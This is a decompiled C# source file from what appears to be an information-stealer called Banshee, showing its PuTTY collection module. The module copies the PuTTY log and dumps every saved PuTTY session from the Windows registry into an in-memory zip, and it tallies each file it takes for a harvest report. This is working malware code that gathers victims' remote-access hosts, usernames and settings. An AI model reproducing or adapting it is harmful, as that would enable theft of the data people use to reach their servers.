﻿using System;
using System.IO;
using System.Linq;
using Banshee.Helper;
using Banshee.Helper.Data;
using Microsoft.Win32;

namespace Banshee.Targets.Applications
{
	// Token: 0x020000A1 RID: 161
	public class PuTTY : ITarget
	{
		// Token: 0x060001DD RID: 477 RVA: 0x0000FDD0 File Offset: 0x0000FDD0
		public void Collect(InMemoryZip zip, Counter counter)
		{
			Counter.CounterApplications counterApplications = new Counter.CounterApplications();
			counterApplications.Name = "PuTTY";
			this.Logs(zip, counterApplications);
			this.Sessions(zip, counterApplications);
			if (counterApplications.Files.Count > 0)
			{
				counterApplications.Files.Add("PuTTY\\");
				counter.Applications.Add(counterApplications);
			}
		}

		// Token: 0x060001DE RID: 478 RVA: 0x0000FE28 File Offset: 0x0000FE28
		private void Logs(InMemoryZip zip, Counter.CounterApplications counterApplications)
		{
			string text = "C:\\Program Files\\PuTTY\\putty.log";
			if (File.Exists(text))
			{
				string text2 = "PuTTY\\putty.log";
				zip.AddFile(text2, File.ReadAllBytes(text));
				counterApplications.Files.Add(text + " => " + text2);
			}
		}

		// Token: 0x060001DF RID: 479 RVA: 0x0000FE70 File Offset: 0x0000FE70
		private void Sessions(InMemoryZip zip, Counter.CounterApplications counterApplications)
		{
			string text = "Software\\SimonTatham\\PuTTY\\Sessions";
			using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(text, false))
			{
				if (registryKey != null)
				{
					string[] array = registryKey.GetSubKeyNames().OrderBy((string x) => x, StringComparer.OrdinalIgnoreCase).ToArray<string>();
					if (array.Length != 0)
					{
						foreach (string text2 in array)
						{
							using (RegistryKey registryKey2 = registryKey.OpenSubKey(text2, false))
							{
								if (registryKey2 != null)
								{
									string text3 = "PuTTY\\session_" + text2 + ".txt";
									string text4 = string.Join("\n", RegistryParser.ParseKey(registryKey2));
									zip.AddTextFile(text3, text4);
									counterApplications.Files.Add(string.Concat(new string[]
									{
										text,
										"\\",
										text2,
										" => ",
										text3
									}));
								}
							}
						}
					}
				}
			}
		}
	}
}
